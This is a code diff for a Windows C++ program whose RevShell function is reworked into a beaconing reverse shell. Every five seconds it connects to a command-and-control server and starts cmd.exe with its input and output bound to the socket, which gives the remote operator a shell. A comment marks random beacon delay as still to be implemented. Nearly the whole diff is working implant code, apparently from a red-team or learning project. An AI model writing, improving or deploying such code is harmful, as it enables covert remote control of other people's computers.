@@ -10,58 +10,76 @@
 
 void RevShell(char* C2Server, int C2Port)
 {
-	// WSADATA object - contains details of application state regarding to network
-	WSADATA wsaver;
-
-	// Version comparison - whether compiled version of sockets is compatible with the older versions
-	WSAStartup(MAKEWORD(2,2), &wsaver);
-
-
-	SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	sockaddr_in addr;
-
-	addr.sin_family = AF_INET;
-	addr.sin_addr.s_addr = inet_addr(C2Server);
-	addr.sin_port = htons(C2Port);
-
-	// This if statement triggers if connection to C&C errored out.
-	if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
-		std::cout << "[-] Error during connection..\n";
-		closesocket(tcpsock);
-		WSACleanup();
-		exit(0);
-	}
-	// Else connection successfull..
-	else {
-		std::cout << "[+] Connected..\n" << std::endl;
+	while (true) {
 		
-		char CommandReceived[1024] = "";
-		// Waiting for incoming connection..
-		while (true) {
-			int Result = recv(tcpsock, CommandReceived, 1024, 0);
-			std::cout << "Command Received: " << CommandReceived;
-			std::cout << "Length of Command: " << Result << std::endl;
+		// BEACONING
+		// NEED TO IMPLEMENT RANDOM DELAY
+		Sleep(5000);
+
+
+
+		// WSADATA object - contains details of application state regarding to network
+		WSADATA wsaver;
+		// Version comparison - whether compiled version of sockets is compatible with the older versions
+		WSAStartup(MAKEWORD(2,2), &wsaver);
+
+
+		SOCKET tcpsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+		sockaddr_in addr;
+
+		addr.sin_family = AF_INET;
+		addr.sin_addr.s_addr = inet_addr(C2Server);
+		addr.sin_port = htons(C2Port);
+
+		// This if statement triggers if connection to C&C errored out.
+		if (WSAConnect(tcpsock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
+			std::cout << "[-] Error during connection..\n";
+			closesocket(tcpsock);
+			WSACleanup();
+			// Go to next Beacon interaction if connection failed...
+			continue;
+		}
+		// Else connection successfull..
+		else {
+			std::cout << "[+] Connected..\n" << std::endl;
 			
-			if (strcmp(CommandReceived, "exit\n") == 0) {
-				std::cout << "Command parsed: exit";
-				std::cout << "Closing connection..." << std::endl;
-				Sleep(1000);
-				exit(0);
+			char RecvData[1024];
+			memset(RecvData, 0, sizeof(RecvData));
+			int RecvCode = recv(tcpsock, RecvData, 1024, 0);
+			if (RecvCode <= 0){
+				closesocket(tcpsock);
+				WSACleanup();
+				continue;
 			}
 			else {
-				std::cout << "Command not parsed!" << std::endl;
-				char buffer[20] = "Invalid command\n";
-				send(tcpsock,buffer,strlen(buffer)+1,0);
-				memset(buffer, 0, sizeof(buffer));
-				memset(CommandReceived, 0, sizeof(CommandReceived));
+				char Process[] = "cmd.exe";
+				STARTUPINFO sinfo;
+				PROCESS_INFORMATION pinfo;
+				memset(&sinfo, 0, sizeof(sinfo));
+				sinfo.cb = sizeof(sinfo);
+				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+				// Socket is Handle for stdin/stdout/stderr descriptors of process
+				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcpsock;
+				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+				CloseHandle(pinfo.hProcess);
+				CloseHandle(pinfo.hThread);
+				memset(RecvData, 0, sizeof(RecvData));
+				int RecvCode = recv(tcpsock, RecvData, 1024, 0);
+				if (RecvCode <= 0){
+					closesocket(tcpsock);
+					WSACleanup();
+					continue;
+				} 
+				if (strcmp(RecvData, "exit\n") == 0) {
+					exit(0);
+				}
 			}
-			memset(CommandReceived, 0, sizeof(CommandReceived));
+			
 		}
+
 	}
-	closesocket(tcpsock);
-	WSACleanup();
-	exit(0);
 }
+
 
 int main(int argc, char **argv)
 {
